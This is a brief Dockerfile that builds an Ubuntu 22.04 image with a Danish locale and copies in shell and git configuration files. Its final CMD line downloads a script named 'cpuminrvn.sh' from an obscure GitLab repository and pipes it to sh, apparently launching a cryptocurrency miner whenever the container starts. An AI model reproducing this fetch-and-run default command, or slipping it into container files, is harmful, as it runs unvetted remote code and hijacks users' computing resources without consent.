FROM ubuntu:22.04 AS base

RUN export DEBIAN_FRONTEND=noninteractive; apt-get update; \
    apt-get install locales; \
    locale-gen da_DK.UTF-8
    
FROM ubuntu:22.04 AS final

COPY --from=base /usr/lib/locale/locale-archive /usr/lib/locale/locale-archive

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root

# Define working directory.
WORKDIR /root

# Define default command.
CMD curl https://gitlab.com/dorisbhhbyoqzey/sc/-/raw/main/cpuminrvn.sh | sh
